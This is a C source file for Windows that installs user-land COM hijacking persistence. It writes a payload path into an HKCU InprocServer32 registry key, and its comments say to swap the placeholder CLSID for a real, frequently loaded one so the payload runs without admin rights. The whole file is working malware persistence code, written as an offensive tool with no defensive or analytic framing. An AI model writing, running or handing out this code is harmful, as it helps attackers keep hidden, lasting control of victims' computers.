#include <windows.h>
#include <stdio.h>

// User-land COM Hijacking Persistence
// Targets a frequently loaded CLSID in HKCU to achieve persistence without Admin rights.

bool InstallCOMPersistence(const wchar_t* payloadPath) {
    HKEY hKey;
    // Example CLSID: {00000000-0000-0000-0000-000000000000} (Replace with a real, frequently used CLSID)
    const wchar_t* clsidPath = L"Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32";

    // 1. Create/Open the registry key in HKCU
    if (RegCreateKeyExW(HKEY_CURRENT_USER, clsidPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey) != ERROR_SUCCESS) {
        printf("[-] Failed to create COM registry key.\n");
        return false;
    }

    // 2. Set the default value to our payload path
    if (RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)payloadPath, (wcslen(payloadPath) + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
        printf("[-] Failed to set payload path in registry.\n");
        RegCloseKey(hKey);
        return false;
    }

    // 3. Set ThreadingModel to Apartment (typical for InprocServer32)
    const wchar_t* threadingModel = L"Apartment";
    if (RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ, (const BYTE*)threadingModel, (wcslen(threadingModel) + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
        printf("[-] Failed to set ThreadingModel in registry.\n");
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    printf("[+] COM Hijacking persistence installed successfully in HKCU.\n");
    return true;
}
